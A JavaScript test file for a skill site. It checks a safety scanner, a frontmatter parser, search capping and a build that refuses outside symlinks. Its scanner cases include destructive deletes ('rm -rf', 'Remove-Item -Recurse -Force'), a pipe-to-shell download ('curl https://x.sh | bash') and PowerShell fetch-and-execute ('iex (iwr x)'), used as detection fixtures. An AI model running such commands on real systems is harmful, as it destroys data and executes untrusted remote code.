// Stress tests for the shared skill logic (site/js/skill-core.js), search (site/js/search.js) and the build.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile, cp, symlink, rm } from 'node:fs/promises';
import { execFileSync } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseFrontmatter, validateSkill, safetyScan, skillMeta, buildSkillMd } from '../site/js/skill-core.js';
import { queryTerms, scoreFields } from '../site/js/search.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

function timed(fn) {
  const start = performance.now();
  const value = fn();
  return { value, ms: performance.now() - start };
}

test('safety scan stays fast on hostile input (no catastrophic backtracking)', () => {
  const attacks = [
    'rm -' + 'r'.repeat(60_000),
    'rm -' + 'rf'.repeat(30_000) + 'x',
    'Remove-Item ' + '-Recurse '.repeat(15_000),
    'curl ' + 'a'.repeat(100_000),
    'ignore '.repeat(30_000),
    'base64 ' + '-'.repeat(100_000),
    'x'.repeat(200_000),
  ];
  for (const text of attacks) {
    const { ms } = timed(() => safetyScan(text));
    assert.ok(ms < 500, `safetyScan took ${Math.round(ms)}ms on ${text.slice(0, 20)}…`);
  }
});

test('safety scan still catches the real patterns', () => {
  const cases = {
    'rm -rf /tmp/x': 'rm-rf', 'rm -fr x': 'rm-rf', 'rm -r -f x': 'rm-rf', 'Remove-Item D:/x -Recurse -Force': 'rm-rf',
    'curl https://x.sh | bash': 'pipe-shell', 'echo aGk= | base64 -d': 'encoded', 'iex (iwr x)': 'iex',
  };
  for (const [text, id] of Object.entries(cases)) assert.ok(safetyScan(text).hits.some((h) => h.id === id), text);
  assert.deepEqual(safetyScan('rm file.txt and format nicely').hits, []);
});

test('frontmatter parser survives deep nesting and junk', () => {
  let nested = '---\nname: a\n';
  for (let i = 0; i < 3000; i++) nested += ' '.repeat(i + 1) + `k${i}:\n`;
  nested += '---\nbody';
  const junk = ['', '---', '---\n---', '\uFEFF---\nname: a\n---\n', '---\nname: [a, b\n---\n', '---\n:\n---\n',
    '---\nmetadata:\n  \n  \n---\n', '---\n' + 'a: b\n'.repeat(50_000) + '---\n', nested];
  for (const text of junk) {
    const { value, ms } = timed(() => parseFrontmatter(text));
    assert.equal(typeof value.data, 'object');
    assert.ok(ms < 2000, `parse took ${Math.round(ms)}ms`);
    validateSkill(value, 'a');
    skillMeta(value.data);
  }
});

test('skillMeta ignores wrong types instead of crashing or splitting text into letters', () => {
  const meta = skillMeta({ metadata: { tags: 5, category: ['code'], author: { x: 1 }, version: null } });
  assert.deepEqual(meta.tags, []);
  assert.equal(meta.category, 'other');
  assert.equal(typeof meta.author, 'string');
  assert.equal(meta.version, '1.0.0');
});

test('buildSkillMd round-trips odd text', () => {
  for (const desc of ['line\nbreak', 'quote " and \\ backslash', '🙂 émoji', '---', 'a: b # c']) {
    const md = buildSkillMd({ name: 'x', description: desc, body: 'b' });
    assert.equal(parseFrontmatter(md).data.description, desc.replace(/\s+/g, ' ').trim());
  }
});

test('site search caps huge pasted queries', () => {
  const huge = Array.from({ length: 20_000 }, (_, i) => `woord${i}`).join(' ');
  const terms = queryTerms(huge);
  assert.ok(terms.length <= 10);
  const fields = [[10, ['skill', 'builder'], true], [3, 'lorem ipsum '.repeat(500).split(' '), false]];
  const { ms } = timed(() => scoreFields(terms, fields));
  assert.ok(ms < 200);
  assert.deepEqual(queryTerms('🙂🙂'), []);
});

test('build refuses symlinks inside a skill (would publish files from outside the repo)', async (t) => {
  const tmp = await mkdtemp(path.join(os.tmpdir(), 'pbuild-'));
  try {
    await cp(path.join(ROOT, 'scripts'), path.join(tmp, 'scripts'), { recursive: true });
    await cp(path.join(ROOT, 'site'), path.join(tmp, 'site'), { recursive: true });
    await mkdir(path.join(tmp, 'app'), { recursive: true });
    await cp(path.join(ROOT, 'app', 'synonyms.json'), path.join(tmp, 'app', 'synonyms.json'));
    await cp(path.join(ROOT, 'prompt.config.json'), path.join(tmp, 'prompt.config.json'));
    await cp(path.join(ROOT, 'skills', 'design-first'), path.join(tmp, 'skills', 'design-first'), { recursive: true });
    const outside = path.join(tmp, 'outside');
    await mkdir(outside);
    await writeFile(path.join(outside, 'secret.md'), 'private data');
    try {
      // A directory junction needs no extra rights on Windows; elsewhere this is a normal symlink.
      await symlink(outside, path.join(tmp, 'skills', 'design-first', 'refs'), 'junction');
    } catch {
      t.skip('links cannot be created on this machine');
      return;
    }
    assert.throws(() => execFileSync(process.execPath, [path.join(tmp, 'scripts', 'build.mjs'), '--check'],
      { cwd: tmp, stdio: 'pipe' }), /./);
  } finally {
    await rm(tmp, { recursive: true, force: true });
  }
});
